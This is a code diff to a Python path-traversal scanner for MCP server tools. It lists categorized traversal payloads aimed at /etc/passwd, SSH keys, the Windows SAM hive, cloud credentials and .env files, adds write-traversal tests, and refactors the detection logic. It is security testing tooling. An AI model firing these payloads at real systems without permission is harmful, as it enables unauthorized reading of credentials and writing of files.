@@ -13,12 +13,12 @@ Tests 100+ payloads across 7 categories:
 
 from __future__ import annotations
 
-import re
 import logging
+import re
 from typing import Any
 
 from mcpsec.client.mcp_client import MCPSecClient
-from mcpsec.models import Finding, Severity, ServerProfile, ToolInfo
+from mcpsec.models import Finding, ServerProfile, Severity
 from mcpsec.scanners.base import BaseScanner
 
 logger = logging.getLogger(__name__)
@@ -26,10 +26,31 @@ logger = logging.getLogger(__name__)
 # ─── Parameter keywords ─────────────────────────────────────────────────────
 
 PATH_PARAM_KEYWORDS = [
-    "path", "filepath", "file", "filename", "dir", "directory",
-    "folder", "src", "dest", "destination", "location", "name",
-    "template", "include", "page", "doc", "document", "root",
-    "resource", "uri", "url", "load", "read", "open", "import",
+    "path",
+    "filepath",
+    "file",
+    "filename",
+    "dir",
+    "directory",
+    "folder",
+    "src",
+    "dest",
+    "destination",
+    "location",
+    "name",
+    "template",
+    "include",
+    "page",
+    "doc",
+    "document",
+    "root",
+    "resource",
+    "uri",
+    "url",
+    "load",
+    "read",
+    "open",
+    "import",
 ]
 
 # ─── Payloads by category ───────────────────────────────────────────────────
@@ -49,7 +70,6 @@ PAYLOADS: dict[str, list[str]] = {
         "/etc/passwd",
         "file:///etc/passwd",
     ],
-
     "basic_windows": [
         "..\\..\\..\\windows\\win.ini",
         "..\\..\\..\\..\\windows\\win.ini",
@@ -59,7 +79,6 @@ PAYLOADS: dict[str, list[str]] = {
         "\\\\localhost\\c$\\windows\\win.ini",
         "file:///C:/windows/win.ini",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 2: ENCODING BYPASSES
     # ═══════════════════════════════════════════════════════════════
@@ -71,7 +90,6 @@ PAYLOADS: dict[str, list[str]] = {
         "%252e%252e%252f",
         "%2e%2e%5c%2e%2e%5cetc/passwd",
     ],
-
     "unicode_encoding": [
         "..%c0%af..%c0%afetc/passwd",
         "..%ef%bc%8f..%ef%bc%8fetc/passwd",
@@ -79,7 +97,6 @@ PAYLOADS: dict[str, list[str]] = {
         "\u002e\u002e/\u002e\u002e/etc/passwd",
         "\u3002\u3002/\u3002\u3002/etc/passwd",
     ],
-
     "null_byte": [
         "../../../etc/passwd%00",
         "../../../etc/passwd%00.jpg",
@@ -89,7 +106,6 @@ PAYLOADS: dict[str, list[str]] = {
         "..\\..\\..\\windows\\win.ini%00",
         "..\\..\\..\\windows\\win.ini%00.jpg",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 3: PATH NORMALIZATION BYPASSES
     # ═══════════════════════════════════════════════════════════════
@@ -108,7 +124,6 @@ PAYLOADS: dict[str, list[str]] = {
         "..%00/..%00/etc/passwd",
         "..\\..\\..\\.\\etc\\passwd",
     ],
-
     "mixed_separators": [
         "..\\../..\\../etc/passwd",
         "../..\\../..\\etc/passwd",
@@ -116,7 +131,6 @@ PAYLOADS: dict[str, list[str]] = {
         "..%2f..%5c..%2fetc/passwd",
         "..%5c..%2f..%5cetc\\passwd",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 4: ABSOLUTE PATH BYPASS
     # ═══════════════════════════════════════════════════════════════
@@ -129,7 +143,6 @@ PAYLOADS: dict[str, list[str]] = {
         "/etc/./passwd",
         "/etc/../etc/passwd",
     ],
-
     "absolute_paths_windows": [
         "C:\\windows\\win.ini",
         "C:/windows/win.ini",
@@ -139,7 +152,6 @@ PAYLOADS: dict[str, list[str]] = {
         "\\\\localhost\\c$\\windows\\win.ini",
         "//?/C:/windows/win.ini",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 5: WRAPPER/PROTOCOL BYPASSES
     # ═══════════════════════════════════════════════════════════════
@@ -154,7 +166,6 @@ PAYLOADS: dict[str, list[str]] = {
         "zip:///tmp/test.zip#../../../etc/passwd",
         "phar:///tmp/test.phar/x/../../../etc/passwd",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 6: SENSITIVE TARGET FILES
     # ═══════════════════════════════════════════════════════════════
@@ -170,14 +181,12 @@ PAYLOADS: dict[str, list[str]] = {
         "/root/.ssh/authorized_keys",
         "/root/.bash_history",
     ],
-
     "sensitive_files_windows": [
         "C:\\windows\\system32\\config\\SAM",
         "C:\\windows\\system32\\config\\SYSTEM",
         "C:\\windows\\repair\\SAM",
         "C:\\windows\\debug\\netsetup.log",
     ],
-
     "cloud_credentials": [
         "~/.aws/credentials",
         "~/.aws/config",
@@ -192,7 +201,6 @@ PAYLOADS: dict[str, list[str]] = {
         "../.env",
         "../../.env",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 7: ZIP SLIP (Archive Extraction)
     # ═══════════════════════════════════════════════════════════════
@@ -200,6 +208,15 @@ PAYLOADS: dict[str, list[str]] = {
         "../../../tmp/evil.txt",
         "foo/../../../tmp/evil.txt",
         "foo/bar/../../../tmp/evil.txt",
+    ],
+    "write_traversal": [
+        "mcpsec_test.txt",
+        "../../mcpsec_test.txt",
+        "C:\\windows\\temp\\mcpsec_test.txt",
+        "C:/windows/temp/mcpsec_test.txt",
+        "/tmp/mcpsec_test.txt",
+        "../../../../../../../../../../tmp/mcpsec_test.txt",
+        "C:\\mcpsec_test.txt",
     ],
 }
 
@@ -242,6 +259,10 @@ SUCCESS_INDICATORS: dict[str, list[str]] = {
         r"API_KEY=",
         r"DB_PASSWORD=",
     ],
+    "write_success": [
+        r"(?:exported|saved|written|downloaded|created).*(?:to|as|file).*(?:mcpsec_test\.txt|/tmp/|\\temp\\)",
+        r"mcpsec_test\.txt",
+    ],
     "error_leaks": [
         r"ENOENT",
         r"No such file or directory",
@@ -261,31 +282,33 @@ for category_payloads in PAYLOADS.values():
 def _extract_response(result: Any) -> str:
     """Extract text from an MCP tool call result."""
     text = ""
-    if hasattr(result, 'content'):
+    if hasattr(result, "content"):
         for block in result.content:
-            if hasattr(block, 'text'):
+            if hasattr(block, "text"):
                 text += block.text
     return text
 
 
-def _check_indicators(response_text: str) -> tuple[str, str]:
+def _check_indicators(response_text: str, raw_result: Any = None) -> tuple[str, str]:
     """
     Check response against success indicators.
+    Uses response_classifier for SAFE detection first.
     Returns (evidence, confidence) — CONFIRMED, LIKELY, or empty.
     """
-    # Strong evidence: file contents
-    for pattern in SUCCESS_INDICATORS["etc_passwd"]:
-        if re.search(pattern, response_text):
-            return f"/etc/passwd contents detected: {pattern}", "CONFIRMED"
+    from mcpsec.scanners.response_classifier import Verdict, classify_path_traversal
 
-    for pattern in SUCCESS_INDICATORS["win_ini"]:
-        if re.search(pattern, response_text):
-            return f"win.ini contents detected: {pattern}", "CONFIRMED"
+    verdict, evidence = classify_path_traversal(response_text, raw_result)
 
-    for pattern in SUCCESS_INDICATORS["ssh_keys"]:
-        if re.search(pattern, response_text):
-            return f"SSH private key detected: {pattern}", "CONFIRMED"
+    if verdict == Verdict.SAFE:
+        return "", ""  # Suppressed — security controls blocked the attack
 
+    if verdict == Verdict.CONFIRMED:
+        return evidence, "CONFIRMED"
+
+    if verdict == Verdict.LIKELY:
+        return evidence, "LIKELY"
+
+    # Fall back to legacy checks for extra coverage
     for pattern in SUCCESS_INDICATORS["cloud_creds"]:
         if re.search(pattern, response_text, re.IGNORECASE):
             return f"Cloud credentials detected: {pattern}", "CONFIRMED"
@@ -298,10 +321,9 @@ def _check_indicators(response_text: str) -> tuple[str, str]:
         if re.search(pattern, response_text):
             return f"/proc/self contents detected: {pattern}", "CONFIRMED"
 
-    # Weak evidence: error messages that reveal path existence
-    for pattern in SUCCESS_INDICATORS["error_leaks"]:
+    for pattern in SUCCESS_INDICATORS["write_success"]:
         if re.search(pattern, response_text, re.IGNORECASE):
-            return f"Path access error leaked: {pattern}", "LIKELY"
+            return f"Successful write to sensitive/traversed path: {pattern}", "LIKELY"
 
     return "", ""
 
@@ -315,12 +337,20 @@ class PathTraversalScanner(BaseScanner):
     name = "path-traversal"
     description = "Detect path traversal vulnerabilities with 100+ categorized payloads"
 
-    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
+    async def scan(
+        self, profile: ServerProfile, client: MCPSecClient | None = None
+    ) -> list[Finding]:
         findings: list[Finding] = []
         if not client:
             return findings
 
+        from mcpsec.scanners.response_classifier import is_tool_relevant
+
         for tool in profile.tools:
+            # Scanner scoping: skip tools unlikely to do file operations
+            if not is_tool_relevant(tool.name, tool.description, "path-traversal"):
+                continue
+
             # Find injectable parameters
             path_params = set()
 
@@ -342,35 +372,41 @@ class PathTraversalScanner(BaseScanner):
                     if found_vuln:
                         break
                     try:
-                        result = await client.call_tool(tool.name, {param_name: payload})
+                        call_args = self._get_dummy_args(tool, param_name, payload)
+                        result = await client.call_tool(tool.name, call_args)
                         response_text = _extract_response(result)
-                        is_error = getattr(result, 'isError', False)
+                        is_error = getattr(result, "isError", False)
 
-                        evidence, confidence = _check_indicators(response_text)
+                        clean_response = response_text.replace(payload, "")
+                        evidence, confidence = _check_indicators(clean_response, result)
 
                         if evidence:
-                            severity = Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
-                            findings.append(Finding(
-                                severity=severity,
-                                scanner=self.name,
-                                tool_name=tool.name,
-                                parameter=param_name,
-                                title=f"Path Traversal in '{param_name}' [{confidence}]",
-                                description=(
-                                    f"Tool '{tool.name}' is vulnerable to path traversal "
-                                    f"via the '{param_name}' parameter."
-                                ),
-                                detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
-                                evidence=evidence,
-                                confidence=confidence.lower(),
-                                remediation=(
-                                    "Validate paths against an allowlist of permitted directories. "
-                                    "Use os.path.realpath() and verify the resolved path starts "
-                                    "with the intended base directory. Never pass raw user input "
-                                    "to file system operations."
-                                ),
-                                cwe="CWE-22",
-                            ))
+                            severity = (
+                                Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
+                            )
+                            findings.append(
+                                Finding(
+                                    severity=severity,
+                                    scanner=self.name,
+                                    tool_name=tool.name,
+                                    parameter=param_name,
+                                    title=f"Path Traversal in '{param_name}' [{confidence}]",
+                                    description=(
+                                        f"Tool '{tool.name}' is vulnerable to path traversal "
+                                        f"via the '{param_name}' parameter."
+                                    ),
+                                    detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
+                                    evidence=evidence,
+                                    confidence=confidence.lower(),
+                                    remediation=(
+                                        "Validate paths against an allowlist of permitted directories. "
+                                        "Use os.path.realpath() and verify the resolved path starts "
+                                        "with the intended base directory. Never pass raw user input "
+                                        "to file system operations."
+                                    ),
+                                    cwe="CWE-22",
+                                )
+                            )
                             found_vuln = True
 
                     except Exception as e:
